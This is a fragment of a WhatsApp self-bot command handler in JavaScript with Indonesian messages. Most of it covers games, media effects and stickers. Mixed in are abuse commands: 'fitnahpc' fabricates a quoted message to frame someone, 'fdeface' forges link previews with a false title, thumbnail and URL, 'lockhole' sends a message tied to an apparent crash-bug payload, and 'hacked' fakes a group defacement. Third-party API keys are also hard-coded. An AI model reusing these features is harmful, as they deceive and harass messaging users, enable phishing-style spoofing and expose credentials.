  if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.only.group)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
if (!q) return reply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=${q}&apikey=GSdohIiH`)
//	let petunjuk = anu.data.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
reply(`*Soal :*\n_${anu.data.nilai_1} ${anu.data.tanda} ${anu.data.nilai_2} :_\nWaktu : ${gamewaktu}`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
	}
break

case 'family100':{
  if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.only.group)
if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolkey}`)
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.aswer.length}\n\nWaktu : ${gamewaktu}s`)
let anoh = anu.data.result.aswer
let rgfds = []
for (let i of anoh){
let fefs = i.split('/') ? i.split('/')[0] : i
let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
rgfds.push(axsf.toLowerCase())
  }
game.addfam(from, rgfds, gamewaktu, family100)
gameAdd(sender, glimit)
  }
break
      case 'fitnahpc':
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(' ').replace(/@|\d/gi, '').split('|');
        var taged = rojak.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        let responye = await arifi.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await arifi.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
      case 'tomp3': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!isQuotedVideo) return fakegroup('Reply videonya!');
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm'))
          .message.extendedTextMessage.contextInfo;
        media = await arifi.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom('.mp4');
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          arifi.sendMessage(from, buffer453, audio, {
            mimetype: 'audio/mp4',
            quoted: rojak,
          });
          fs.unlinkSync(ran);
        });
        limitAdd(sender, limit)
        break;   
        case 'tupai':
				 if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
					encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await arifi.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a 'atempo=0.5,asetrate=65100' ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						arifi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: rojak})
						fs.unlinkSync(ran)
					})
					limitAdd(sender, limit)
				break
				case 'gemok':
				 if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
					encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await arifi.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a 'atempo=1.6,asetrate=22100' ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						arifi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: rojak})
						fs.unlinkSync(ran)
					})
					limitAdd(sender, limit)
				break
				case 'bass':                 
				 if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
					encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await arifi.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						arifi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: rojak})
						fs.unlinkSync(ran)
					})
					limitAdd(sender, limit)
				break
				case 'budek':
 if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
	encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo

	media = await arifi.downloadAndSaveMediaMessage(encmedia)

	ran = getRandom('.mp3')

	exec(`ffmpeg -i ${media} -filter:a 'volume=50' ${ran}`, (err, stderr, stdout) => {

fs.unlinkSync(media)

if (err) return reply('Error!')

res = fs.readFileSync(ran)

arifi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: rojak})
						fs.unlinkSync(ran)

	})
limitAdd(sender, limit)
break
      case 'fast': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!isQuotedVideo) return fakegroup('Reply videonya!');
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm'))
          .message.extendedTextMessage.contextInfo;
        media = await arifi.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom('.mp4');
        exec(
          `ffmpeg -i ${media} -filter_complex '[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]' -map '[v]' -map '[a]' ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            arifi.sendMessage(from, buffer453, video, {
              mimetype: 'video/mp4',
              quoted: rojak,
            });
            fs.unlinkSync(ran);
          }
        );
        limitAdd(sender, limit)
        break;   
      case 'slow': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!isQuotedVideo) return fakegroup('Reply videonya!');
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm'))
          .message.extendedTextMessage.contextInfo;
        media = await arifi.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom('.mp4');
        exec(
          `ffmpeg -i ${media} -filter_complex '[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]' -map '[v]' -map '[a]' ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            arifi.sendMessage(from, buffer453, video, {
              mimetype: 'video/mp4',
              quoted: rojak,
            });
            fs.unlinkSync(ran);
          }
        );
        limitAdd(sender, limit)
        break;   
      case 'reverse': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!isQuotedVideo) return fakegroup('Reply videonya!');
        encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm'))
          .message.extendedTextMessage.contextInfo;
        media = await arifi.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom('.mp4');
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          arifi.sendMessage(from, buffer453, video, {
            mimetype: 'video/mp4',
            quoted: rojak,
          });
          fs.unlinkSync(ran);
        });
        limitAdd(sender, limit)
        break;   

      case 'anime': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        reply(mess.wait);
        fetch(
          'https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt'
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split('\n');
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, 'base64');
                arifi.sendMessage(from, media, image, {
                  quoted: rojak,
                  caption: 'NIH',
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        limitAdd(sender, limit)
        break;   
      case 'kontak': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        pe = args.join(' ');
        entah = pe.split('|')[0];
        nah = pe.split('|')[1];
        if (isNaN(entah)) return reply('Invalid phone number');
        vcard =
          'BEGIN:VCARD\n' +
          'VERSION:3.0\n' +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            '+' + entah
          ).getNumber('internasional')}\n` +
          'END:VCARD'.trim();
        arifi.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        limitAdd(sender, limit)
        break;   
 
                      case 'bc3':
      case 'bcbutton':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await arifi.chats.all()
             if (isMedia && !arifi.message.videoMessage || isQuotedImage) {
             let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
             bc2 = await arifi.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             arifi.sendMessage(_.jid, { contentText: `${body.slice(4)}`, footerText: watermark, buttons: [{ buttonId: `${prefix}command`, buttonText: { displayText: 'MENU' }, type: 1 }, { buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }], headerType: 6, locationMessage: { degreesLatitude: 0, degreesLongitude: 0, jpegThumbnail: bc2 }}, 'buttonsMessage')
}
             reply('Suksess broadcast')
}
             break


case 'lockhole':
arifi.updatePresence(from, Presence.composing)
me = arifi.user
uptime = process.uptime()
ImageFakes = 'https://i.ibb.co/YP0T7dY/fake-Buffer.jpg'
bro = await getBuffer(ImageFakes)
                     arifi.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: botUniversal,
						address: watermark,
                        jpegThumbnail: bro, },location,{ quoted: BugTroli, sendEphemeral: true, toggleDisappearingMessages: true, contextInfo: {'mentionedJid': [sender], forwardingScore: 1000, isForwarded: true}})
                        break
case 'hacked':
if (!rojak.key.fromMe) return reply(mess.me)
  if (!isGroup) return reply(mess.only.group)
  if (!isBotGroupAdmins) return reply(mess.only.Badmin)
  if (args.length < 1) return reply('Teksnya?')
  reply('WAIT BRADER')
    tessgc = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMMifE9NUhXCLIiouBBzPO0Gz32PpJHyNxgA&usqp=CAU`)
       arifi.updateProfilePicture (from, tessgc)
       await sleep(1000)
    arifi.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
    await sleep(1000)
    arifi.groupUpdateDescription(from, `Grup Ini Telah Diretas Oleh\n\n\n © 2021-2022 Hacked By @arifirazzaq2001`) 
    await sleep(1000)
    arifi.sendMessage(from, 'UDH GW HACK 😝', MessageType.extendedText, {quoted: rojak})
		break

                    case 'tagall':
			        if (!isGroup) return reply(mess.only.group)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `@${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break

      case 'take':
      case 'colong': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!isQuotedSticker) return reply('Stiker aja om');
        encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm'))
          .message.extendedTextMessage.contextInfo;
        media = await arifi.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(' ').split('|');
        satu = anu[0] !== '' ? anu[0] : `SELF`;
        dua = typeof anu[1] !== 'undefined' ? anu[1] : `BOT`;
        require ('./lib/fetcher.js').createExif(satu, dua);
        require ('./lib/fetcher.js').modStick(media, arifi, rojak, from);
        limitAdd(sender, limit)
        break;   
      case 'stikerwm':
      case 'stickerwm':
      case 'swm': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        pe = args.join('');
        var a = pe.split('|')[0];
        var b = pe.split('|')[1];
        if ((isMedia && !rojak.message.videoMessage) || isQuotedImage) {
          let encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          media = await arifi.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom('.webp');
          ffmpeg(media)
            .on('error', (e) => {
              console.log(e);
              arifi.sendMessage(from, 'Terjadi kesalahan', 'conversation', {
                quoted: rojak,
              });
              fs.unlinkSync(media);
            })
            .on('end', () => {
              _out = getRandom('.webp');
              spawn('webpmux', [
                '-set',
                'exif',
                './stik/data.exif',
                out,
                '-o',
                _out,
              ]).on('exit', () => {
                arifi.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  'stickerMessage',
                  { quoted: rojak }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat('webp')
            .save(out);
        } else if (
          ((isMedia && rojak.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              rojak.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          let encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          let media = await arifi.downloadAndSaveMediaMessage(encmedia);
          pe = args.join('');
          var a = pe.split('|')[0];
          var b = pe.split('|')[1];
          await createExif(a, b);
          out = getRandom('.webp');
          ffmpeg(media)
            .on('error', (e) => {
              console.log(e);
              arifi.sendMessage(from, 'Terjadi kesalahan', 'conversation', {
                quoted: rojak,
              });
              fs.unlinkSync(media);
            })
            .on('end', () => {
              _out = getRandom('.webp');
              spawn('webpmux', [
                '-set',
                'exif',
                './stik/data.exif',
                out,
                '-o',
                _out,
              ]).on('exit', () => {
                arifi.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  'stickerMessage',
                  { quoted: rojak }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat('webp')
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;
      case 'upswteks':
        if (!q) return fakestatus('Isi teksnya!');
        arifi.sendMessage('status@broadcast', `${q}`, extendedText);
        fakegroup(`Sukses Up story wea teks ${q}`);
        break;
      case 'upswimage':
        if (isQuotedImage) {
          let swsw = isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          cihcih = await arifi.downloadMediaMessage(swsw);
          arifi.sendMessage('status@broadcast', cihcih, image, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Image dengan Caption: ${q}`;
          arifi.sendMessage(from, bur, text, { quoted: rojak });
        } else {
          fakestatus('Reply gambarnya!');
        }
        break;
      case 'upswvideo':
        if (isQuotedVideo) {
          let swsw = isQuotedVideo
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          cihcih = await arifi.downloadMediaMessage(swsw);
          arifi.sendMessage('status@broadcast', cihcih, video, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Video dengan Caption: ${q}`;
          arifi.sendMessage(from, bur, text, { quoted: rojak });
        } else {
          fakestatus('reply videonya!');
        }
        break;
      case 'fdeface': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        ge = args.join('');
        var pe = ge.split('|')[0];
        var pen = ge.split('|')[1];
        var pn = ge.split('|')[2];
        var be = ge.split('|')[3];
        let fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        let dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
        let tipes = await arifi.downloadAndSaveMediaMessage(dipes);
        let bufer = fs.readFileSync(tipes);
        let desc = `${pn}`;
        let title = `${pen}`;
        let url = `${pe}`;
        let buu = `https://${be}`;
        var  anu = {
          detectLinks: false,
        };
        var mat = await arifi.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        arifi.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case 'public':
        if (!rojak.key.fromMe) return fakestatus('OWNER ONLY');
        if (banChats === false) return;
        // var taged = rojak.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        fakestatus(`「 *PUBLIC-MODE* 」`);
        break;
      case 'self':
        if (!rojak.key.fromMe) return fakestatus('OWNER ONLY');
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = rojak.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        fakestatus(`「 *SELF-MODE* 」`);
        break;
      case 'hidetag': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!rojak.key.fromMe) return fakestatus('OWNER ONLY');
        if (!isGroup) return reply(mess.only.group);
        var value = args.join(' ');
        var group = await arifi.groupMetadata(from);
        var member = group['participants'];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: rojak,
        };
        arifi.sendMessage(from, optionshidetag, text);
        break;
   /*   case 'play': 
      if (!isPremium) return reply(mess.only.prem)
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (args.length === 0)
          return reply(
            `Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`
          );
        var srch = args.join('');
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          yta(mulaikah).then((res) => {
            let { dl_link, foto, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 100000)
                  return sendMediaURL(
                    from,
                    foto,
                    `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam rojaktuk link_`
                  );
                let captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, foto, captions);
                await sendMediaURL(from, dl_link).catch(() => reply('error'));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;*/
      case 'video':  
      if (!isPremium) return reply(mess.only.prem)
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (args.length === 0)
          return reply(
            `Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`
          );
        var srch = args.join('');
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          ytv(mulaikah).then((res) => {
            let { dl_link, foto, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 100000)
                  return sendMediaURL(
                    from,
                    foto,
                    `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam rojaktuk link_`
                  );
                let captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, foto, captions);
                await sendMediaURL(from, dl_link).catch(() => reply('error'));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break; 
        case 'stickwasted':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
if (rojak.message.extendedTextMessage != undefined || rojak.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
owgi = await arifi.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickwasted.jpeg`, owgi)
  var imgbb = require ('imgbb-uploader');
anu = await imgbb('68cb5bee517bce4f74b0e910a5d96346', './stickwasted.jpeg')
teks = `${anu.display_url}`
sendStickerFromUrl(from, `https://hardianto-chan.herokuapp.com/api/creator/imagemaker?endPoint=wasted&imgUrl=${teks}&apikey=hardianto`,)
fs.unlinkSync('./stickwasted.jpeg')
}
limitAdd(sender, limit)
break
      case 'sticker':
      case 'stiker':
      case 'sg':
      case 's': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          let encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          let media = await arifi.downloadAndSaveMediaMessage(encmedia);
          ran = '666.webp';
          await ffmpeg(`./${media}`)
            .input(media)
            .on('start', function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on('error', function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply('error');
            })
            .on('end', function () {
              console.log('Finish');
              arifi.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: rojak,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat('webp')
            .save(ran);
        } else if (
          ((isMedia && rojak.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              rojak.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          let encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          let media = await arifi.downloadAndSaveMediaMessage(encmedia);
          ran = '999.webp';
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on('error', function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith('.mp4') ? 'video' : 'gif';
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on('end', function () {
              console.log('Finish');
              arifi.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: rojak,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat('webp')
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        limitAdd(sender, limit)
        break;    
        
      case 'toimg': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !');
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm'))
          .message.extendedTextMessage.contextInfo;
        media = await arifi.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom('.png');
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply('Yah gagal, coba ulangi ^_^');
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, 'NIH');
          fs.unlinkSync(ran);
        });
        limitAdd(sender, limit)
        break;   
      case 'ytsearch': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (args.length < 1) return reply('Tolong masukan query!');
        var srch = args.join('');
        try {
          var aramas = await yts(srch);
        } catch {
          return await arifi.sendMessage(
            from,
            'Error!',
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = '';
        ytresult += '「 *YOUTUBE SEARCH* 」';
        ytresult += '\n________________________\n\n';
        aramas.all.map((video) => {
          ytresult += '❏ Title: ' + video.title + '\n';
          ytresult += '❏ Link: ' + video.url + '\n';
          ytresult += '❏ Durasi: ' + video.timestamp + '\n';
          ytresult +=
            '❏ Upload: ' + video.ago + '\n________________________\n\n';
        });
        ytresult += '⦿ *SELF-BOT*';
        await fakethumb(tbuff, ytresult);
        limitAdd(sender, limit)
        break;   
      case 'setreply':
      case 'setfake': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case 'setfakeimg': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (
          ((isMedia && !rojak.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                  .extendedTextMessage.contextInfo
              : rojak;
          delb = await arifi.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpg`, delb);
          fakestatus('Sukses');
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case 'setthumb': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (
          ((isMedia && !rojak.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                  .extendedTextMessage.contextInfo
              : rojak;
          delb = await arifi.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpg`, delb);
          fakestatus('Sukses');
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case 'ytmp4':
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`);
        let isLinks2 = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks2) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          ytv(args[0]).then((res) => {
            let { dl_link, foto, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 40000)
                  return sendMediaURL(
                    from,
                    foto,
                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam rojaktuk link_`
                  );
